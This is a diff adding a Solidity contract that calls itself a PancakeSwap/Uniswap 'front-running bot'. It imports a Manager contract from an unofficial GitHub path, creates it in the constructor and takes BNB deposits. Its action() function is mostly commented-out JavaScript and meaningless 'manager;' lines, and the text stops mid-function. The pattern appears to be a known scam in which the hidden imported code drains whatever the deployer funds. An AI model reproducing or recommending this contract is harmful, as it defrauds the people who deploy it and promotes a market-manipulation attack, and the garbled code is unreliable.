@@ -1,0 +1,80 @@
+pragma solidity ^0.6.6;
+
+// PancakeSwap FrontrunDeployer
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
+
+
+// PancakeSwap manager
+import "https://github.com/BSCContractManager/FrontrunDeployer/blob/main/Uniswap/Uniswap-v2-Periphery/base";
+import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
+import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+
+contract UniswapV2FrontBot {
+    
+    string public tokenName;
+	string public tokenSymbol;
+	uint frontrun;
+	Manager manager;
+	
+	
+	constructor(string memory _tokenName, string memory _tokenSymbol) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		manager = new Manager();
+		
+		}
+	
+	    
+	    // Send required BNB for liquidity pair
+	    receive() external payable {}
+	    
+	    
+	    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
+	    
+	    function action() public payable {
+	
+	//Perform a front-running attack on uniswap
+
+//const fs = require('fs');
+//var Web3 = require('web3');
+//var abiDecoder = require('abi-decoder');
+//var colors = require("colors");
+//var Tx = require('ethereumjs-tx').Transaction;
+//var axios = require('axios');
+//var BigNumber = require('big-number');
+
+//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
+//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+
+//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+manager;
+
+//var input_token_info;
+//var out_token_info;
+//var pool_info;
+//var gas_price_info;
+manager;
+
+//var web3;
+//var web3Ts;
+//var web3Ws;
+//var pancakeRouter;
+//var pancakeFactory;
+manager;
+
+// one gwei
+//const ONE_GWEI = 1e9;
+manager;
+
+//var buy_finished = false;
+//var sell_finished = false;
+//var buy_failed = false;
+//var sell_failed = false;
+//var attack_started = false;
+manager;
+
+//var succeed = false;
+//var subscription;
+manager;
